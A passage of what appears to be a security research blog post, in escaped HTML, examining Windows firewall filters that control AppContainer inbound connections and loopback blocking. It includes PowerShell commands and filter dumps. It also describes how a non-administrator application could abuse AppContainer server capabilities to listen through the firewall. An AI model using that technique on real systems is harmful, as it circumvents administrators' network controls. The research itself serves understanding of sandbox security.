class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : InternetClientServer Inbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 45c5f1d5-6ad2-4a2a-a605-4cab7d4fb257&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 72470&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: InternetClientServer Inbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 824633728960&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp; &amp;nbsp;NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS &amp;nbsp; Range &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Low: 0.0.0.0 High: 255.255.255.255&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ORIGINAL_PROFILE_ID Equal &amp;nbsp; &amp;nbsp; Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_CURRENT_PROFILE_ID &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; Public&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Equal &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;O:LSD:(A;;CC;;;S-1-15-3-2)(A;;CC;;;WD)(A;;CC;;;AN)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The example shows the filter for a &lt;/span&gt;&lt;span class="c7"&gt;Public &lt;/span&gt;&lt;span&gt;network interface granting an AppContainer application the ability to receive network connections. However, this will only be permitted if the socket creator has &lt;/span&gt;&lt;span class="c7"&gt;internetClientServer &lt;/span&gt;&lt;span&gt;capability. Note, there would be similar rules for the private network if the network interface is marked as &lt;/span&gt;&lt;span class="c7"&gt;Private&lt;/span&gt;&lt;span&gt;&amp;nbsp;but only granting access with the &lt;/span&gt;&lt;span class="c7"&gt;privateNetworkClientServer &lt;/span&gt;&lt;span class="c2"&gt;capability. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;As mentioned earlier just because an application has one of these capabilities doesn&amp;#39;t mean it can receive network connections. The default configuration will block the inbound connection. &amp;nbsp;However, when an &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/uwp/"&gt;UWP&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;application is installed and requires one of the two server capabilities, the AppX installer service registers the AppContainer profile with the Windows Defender Firewall service. This adds a filter to permit the AppContainer package to receive inbound connections. For example the following is for the Microsoft Photos application, which is typically installed by default:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.258a3abd87d3e98a3935eba5711ee2ca79c86d64"&gt;&lt;/a&gt;&lt;a id="t.20"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -Id 68299 | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;Format-FwFilter -FormatSecurityDescriptor -Summary&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : @{Microsoft.Windows.Photos_2021...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 7b51c091-ed5f-42c7-a2b2-ce70d777cdea&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 68299&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: @{Microsoft.Windows.Photos_2021...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_FIREWALL&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: Indexed&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 10376294366095343616&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;--------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID Equal &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;microsoft.windows.photos_8wekyb3d8bbwe&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID &amp;nbsp; &amp;nbsp;Equal &amp;nbsp; &amp;nbsp; O:SYG:SYD:(A;;CCRC;;;S-1-5-21-3563698930-1433966124...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;lt;Owner&amp;gt; (Defaulted) : NT AUTHORITY\SYSTEM&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;lt;Group&amp;gt; (Defaulted) : NT AUTHORITY\SYSTEM&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;lt;DACL&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;DOMAIN\alice: (Allowed)(None)(Full Access)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\Your Internet connection:...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\Your Internet connection,...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\Your home or work networks:...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;NAMED CAPABILITIES\Proximity: (Allowed)(None)(Full Access)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;The filter only checks that the package SID matches and that the socket creator is a specific user in an AppContainer. Note this rule doesn&amp;#39;t do any checking on the executable file, remote IP address, port or profile ID. Once an installed AppContainer application is granted a server capability it can act as a server through the firewall for any traffic type or port.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;A normal application could abuse this configuration to run a network service without needing the administrator access normally required to grant the executable access. All you&amp;#39;d need to do is create an arbitrary AppContainer process in the permitted package and grant it the &lt;/span&gt;&lt;span class="c7"&gt;internetClientServer &lt;/span&gt;&lt;span&gt;and/or the &lt;/span&gt;&lt;span class="c7"&gt;privateNetworkClientServer &lt;/span&gt;&lt;span&gt;capabilities. If there isn&amp;#39;t an application installed which has the appropriate firewall rules a non-administrator user can install any signed application with the appropriate capabilities to add the firewall rules. While this clearly circumvents the expected administrator requirements for new listening processes it&amp;#39;s presumably by design.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.fpsp45283a10"&gt;&lt;span class="c25"&gt;Localhost Access&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;One of the specific restrictions imposed on AppContainer applications is blocking access to localhost. The purpose of this is it makes it more difficult to exploit local network services which might not correctly handle AppContainer callers creating a sandbox escape. Let&amp;#39;s test the behavior out and try to connect to a localhost service.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e4db541c042a9a9e3e2091fa0b944a31717e8ea0"&gt;&lt;/a&gt;&lt;a id="t.21"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$token = Get-NtToken -LowBox -PackageSid &amp;quot;LOOPBACK&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Invoke-NtToken $token { &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;&amp;nbsp; &amp;nbsp; [System.Net.Sockets.TcpClient]::new(&amp;quot;127.0.0.1&amp;quot;, 445) &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c20"&gt;Exception calling &amp;quot;.ctor&amp;quot; with &amp;quot;2&amp;quot; argument(s): &amp;quot;A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c20"&gt;connected host has failed to respond 127.0.0.1:445&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;If you compare the error to when we tried to connect to an internet address without the appropriate capability you&amp;#39;ll notice it&amp;#39;s different. When we connected to the internet we got an immediate error indicating that access isn&amp;#39;t permitted. However, for localhost we instead get a timeout error, which is preceded by multi-second delay. Why the difference? Getting the network event which corresponds to the connection and displaying the blocking filter shows something interesting.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c7ae2cade8277de8b62135c0a3f94c9c9988256b"&gt;&lt;/a&gt;&lt;a id="t.22"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -Id 69039 | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c23"&gt;Format-FwFilter -FormatSecurityDescriptor -Summary&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Block&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: a58394b7-379c-43ac-aa07-9b620559955e&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 69039&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: &lt;/span&gt;&lt;span class="c18 c37"&gt;FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 18446744073709551614&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType &amp;nbsp; Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- &amp;nbsp; -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c35"&gt;FWPM_CONDITION_FLAGS &amp;nbsp; &amp;nbsp; &amp;nbsp; FlagsAllSet IsLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID Equal &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;O:LSD:(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1)(A;;CC;;;S-1-15-3-2)...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;lt;Owner&amp;gt; : NT AUTHORITY\LOCAL SERVICE&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;lt;DACL&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\Your Internet connection...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\Your Internet connection, including...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;APPLICATION PACKAGE AUTHORITY\Your home or work networks...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;NAMED CAPABILITIES\Proximity: (Allowed)(None)(Match)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Everyone: (Allowed)(None)(Match)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;NT AUTHORITY\ANONYMOUS LOGON: (Allowed)(None)(Match)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;The blocking filter is not in the connect layer as you might expect, instead it&amp;#39;s in the receive/accept layer. This explains why we get a timeout rather than immediate failure: the &amp;ldquo;inbound&amp;rdquo; connection request is being dropped as per the default configuration. This means the TCP client waits for the response from the server, until it eventually hits the timeout limit.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The second interesting thing to note about the filter is it&amp;#39;s not based on an IP address such as 127.0.0.1. Instead it&amp;#39;s using a condition which checks for the &lt;/span&gt;&lt;span class="c7"&gt;IsLoopback &lt;/span&gt;&lt;span&gt;condition flag (&lt;/span&gt;&lt;span class="c7"&gt;FWP_CONDITION_FLAG_IS_LOOPBACK&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;in the SDK). This flag indicates that the connection is being made through the built-in loopback network, regardless of the destination address. Even if you access the public IP addresses for the local network interfaces the packets will still be routed through the loopback network and the condition flag will be set.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The user ID check is odd, in that the security descriptor matches either AppContainer or non-AppContainer processes. This is of course the point, if it didn&amp;#39;t match both then it wouldn&amp;#39;t block the connection. However, it&amp;#39;s not immediately clear what its actual purpose is if it just matches everything. In my opinion, it adds a risk that the filter will be ignored if the socket creator has disabled the &lt;/span&gt;&lt;span class="c7"&gt;Everyone &lt;/span&gt;&lt;span class="c2"&gt;group. &amp;nbsp;This condition was modified for supporting LPAC over Windows 8, so it&amp;#39;s presumably intentional.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;You might ask, if the filter would block any loopback connection regardless of whether it&amp;#39;s in an AppContainer, how do loopback connections work for normal applications? Wouldn&amp;#39;t this filter always match and block the connection? &amp;nbsp;Unsurprisingly there are some additional permit filters before the blocking filter as shown below. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1840a16fe9f034fa60eca82083ef423c4fbf8a0b"&gt;&lt;/a&gt;&lt;a id="t.23"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -AleLayer RecvAcceptV4 -Sorted | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c23"&gt;Where-Object Name -Match AppContainerLoopback | Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType &amp;nbsp; Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- &amp;nbsp; -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_FLAGS FlagsAllSet IsAppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType &amp;nbsp; Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- &amp;nbsp; -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_FLAGS FlagsAllSet IsReserved&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType &amp;nbsp; Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- &amp;nbsp; -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_FLAGS FlagsAllSet IsNonAppContainerLoopback&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The three filters shown above only check for different condition flags, and you can find documentation for the flags on &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/network/filtering-condition-flags"&gt;MSDN&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Starting at the bottom we have a check for &lt;/span&gt;&lt;span class="c7"&gt;IsNonAppContainerLoopback&lt;/span&gt;&lt;span class="c2"&gt;. This flag is set on a connection when the loopback connection is between non-AppContainer created sockets. This filter is what grants normal applications loopback access. It&amp;#39;s also why an application can listen on localhost even if it&amp;#39;s not granted access to receive connections from the network in the firewall configuration.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;In contrast the first filter checks for the &lt;/span&gt;&lt;span class="c7"&gt;IsAppContainerLoopback &lt;/span&gt;&lt;span class="c2"&gt;flag. Based on the documentation and the name, you might assume this would allow any AppContainer to use loopback to any other. However, based on testing this flag is only set if the two AppContainers have the same package SID. This is presumably to allow an AppContainer to communicate with itself or other processes within its package through loopback sockets. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2"&gt;This flag is also, I suspect, the reason that connecting to a loopback socket is handled in the receive layer rather than the connect layer. Perhaps WFP can&amp;#39;t easily tell ahead of time whether both the connecting and receiving sockets will be in the same AppContainer package, so it delays resolving that until the connection has been received. This does lead to the unfortunate behavior that blocked loopback sockets timeout rather than fail immediately.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The final flag, &lt;/span&gt;&lt;span class="c7"&gt;IsReserved&lt;/span&gt;&lt;span&gt;&amp;nbsp;is more curious. MSDN of course says this is &amp;ldquo;Reserved for future use.&amp;rdquo;, &lt;/span&gt;&lt;span&gt;and the future is now&lt;/span&gt;&lt;span class="c2"&gt;. Though checking back at the filters in Windows 8.1 also shows it being used, so if it was reserved it wasn&amp;#39;t for very long. The obvious conclusion is this flag is really a &amp;ldquo;Microsoft Reserved&amp;rdquo; flag, by that I mean it&amp;#39;s actually used but Microsoft is yet unwilling to publicly document it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;What is it used for? AppContainers are supposed to be a capability based system, where you can just add new capabilities to grant additional privileges. It would make sense to have a loopback capability to grant access, which could be restricted to only being used for debugging purposes. However, it seems that loopback access was so beyond the pale for the designers that instead you can only grant access for debug purposes through an &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/api/netfw/nf-netfw-networkisolationsetappcontainerconfig"&gt;administrator only API&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. Perhaps it&amp;#39;s related? &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a9bbfabe6ecbaa461c5f8cded94710948469c9c2"&gt;&lt;/a&gt;&lt;a id="t.24"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-AppModelLoopbackException -PackageSid &amp;quot;LOOPBACK&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p 